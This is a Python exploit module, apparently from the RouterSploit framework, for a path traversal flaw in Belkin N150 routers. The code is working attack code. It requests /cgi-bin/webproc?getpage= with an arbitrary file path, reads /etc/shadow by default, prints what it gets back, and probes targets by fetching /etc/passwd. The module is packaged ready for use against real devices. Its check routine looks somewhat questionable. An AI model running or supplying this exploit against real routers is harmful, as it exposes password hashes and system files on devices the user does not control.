# rsf exploit module
# description: Exploits Belkin N150 Path Traversal vulnerability which allows reading any file on the system.

import requests

class Exploit:
    __info__ = {
        "name": "Belkin N150 Path Traversal",
        "description": "Module exploits Belkin N150 Path Traversal vulnerability.",
        "authors": (
            "Aditya Lad",  # vulnerability discovery
            "Rahul Pratap Singh",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/38488/",
            "http://www.belkin.com/us/support-article?articleNum=109400",
            "http://www.kb.cert.org/vuls/id/774788",
        ),
        "devices": (
            "Belkin N150 1.00.07",
            "Belkin N150 1.00.08",
            "Belkin N150 1.00.09",
        ),
    }

    def __init__(self, target, port=80, filename="/etc/shadow"):
        self.target = target
        self.port = port
        self.filename = filename

    def run(self):
        if self.check():
            path = f"/cgi-bin/webproc?getpage={self.filename}&var:page=deviceinfo"
            response = requests.get(f"http://{self.target}:{self.port}{path}")
            if response is None:
                return

            if response.status_code == 200 and len(response.text):
                print(f"Success! File: {self.filename}")
                print(response.text)
            else:
                print("Exploit failed")
        else:
            print("Device seems to be not vulnerable")

    def check(self):
        response = requests.get(f"http://{self.target}:{self.port}/cgi-bin/webproc?getpage=/etc/passwd&var:page=deviceinfo")
        if response and "/etc/passwd" in response.text:
            return True  # target vulnerable

        return False  # target is not vulnerable

